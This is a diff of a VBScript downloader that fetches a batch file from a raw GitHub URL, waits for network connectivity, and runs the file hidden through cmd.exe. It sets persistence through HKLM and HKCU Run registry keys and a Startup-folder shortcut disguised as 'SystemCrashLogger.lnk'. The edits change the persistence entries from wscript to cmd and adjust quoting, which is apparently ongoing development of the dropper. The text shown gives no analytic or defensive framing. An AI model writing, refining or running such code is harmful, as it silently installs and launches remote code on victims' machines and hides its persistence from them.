@@ -1,6 +1,6 @@
 ' Define the URL of the batch file and the temporary file location
 Dim objXMLHTTP, objFSO, objShell
-Dim tempFolder, tempBatFile, batchUrl, regKeyHKLM, regKeyHKCU, startupShortcut, taskName
+Dim tempFolder, tempBatFile, batchUrl
 
 batchUrl = "https://raw.githubusercontent.com/spooffewfe/yff/refs/heads/main/final-berlin.bat"
 Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
@@ -28,11 +28,11 @@ If objXMLHTTP.Status = 200 Then
 
     ' Wait for Internet Connection before running the batch file
     Do
-        Set objPing = GetObject("winmgmts:{impersonationLevel=impersonate}").ExecQuery _
+        Set objPing = GetObject("winmgmts:{impersonationLevel=impersonate}").ExecQuery _ 
             ("SELECT * FROM Win32_PingStatus WHERE Address = '8.8.8.8'")
         For Each objStatus In objPing
             If objStatus.StatusCode = 0 Then
-                objShell.Run "cmd.exe /c start /b """" " & tempBatFile, 0, False
+                objShell.Run "cmd.exe /c start /b """" """ & tempBatFile & """", 0, False
                 Exit Do
             End If
         Next
@@ -56,14 +56,14 @@ Sub AddToStartup(scriptPath)
     objShell.RegWrite regKeyHKLM, "cmd.exe /c """ & scriptPath & """", "REG_SZ"
 
     ' Add to HKCU (works without admin)
-    objShell.RegWrite regKeyHKCU, "wscript.exe """ & scriptPath & """", "REG_SZ"
+    objShell.RegWrite regKeyHKCU, "cmd.exe /c """ & scriptPath & """", "REG_SZ"
     On Error GoTo 0
 
     ' Add to Startup Folder
     startupFolder = objShell.SpecialFolders("Startup") & "\SystemCrashLogger.lnk"
     Set shortcut = objShell.CreateShortcut(startupFolder)
-    shortcut.TargetPath = "wscript.exe"
-    shortcut.Arguments = """" & scriptPath & """"
+    shortcut.TargetPath = "cmd.exe"
+    shortcut.Arguments = "/c """ & scriptPath & """"
     shortcut.WorkingDirectory = tempFolder
     shortcut.Save
 End Sub
